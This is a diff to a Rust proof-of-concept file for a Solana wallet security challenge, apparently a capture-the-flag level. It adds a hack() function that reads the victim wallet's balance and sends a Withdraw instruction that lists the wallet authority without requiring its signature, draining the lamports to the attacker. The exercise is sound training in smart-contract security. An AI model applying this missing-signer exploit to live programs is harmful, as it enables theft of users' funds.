@@ -1,10 +1,13 @@
 use std::{env, str::FromStr};
 
+use borsh::BorshSerialize;
+use level1::{Wallet, WalletInstruction};
 use owo_colors::OwoColorize;
 use poc_framework::solana_sdk::signature::Keypair;
 use poc_framework::{
     keypair, solana_sdk::signer::Signer, Environment, LocalEnvironment, PrintableTransaction,
 };
+use solana_program::instruction::{AccountMeta, Instruction};
 use solana_program::native_token::lamports_to_sol;
 
 use pocs::assert_tx_success;
@@ -18,7 +21,26 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    // Get the amount in the victims wallet //
+    let amount_to_steal = env.get_account(challenge.wallet_program).unwrap().lamports;
+    println!("Stealing {} lamports...", amount_to_steal);
+
+    // Create the exploit Transaction //
+    env.execute_as_transaction(&[
+        Instruction {
+            program_id: challenge.wallet_program,
+            accounts: vec![
+                // AccountMeta::new(challenge.wallet_program, false),
+                AccountMeta::new(challenge.wallet_address, false),
+                AccountMeta::new(challenge.wallet_authority, false),
+                AccountMeta::new(challenge.hacker.pubkey(), true),
+                AccountMeta::new_readonly(system_program::id(), false),
+            ],
+            data: WalletInstruction::Withdraw { amount: amount_to_steal }.try_to_vec().unwrap(),
+        }
+    ], &[&challenge.hacker]).print();
+}
 
 /*
 SETUP CODE BELOW
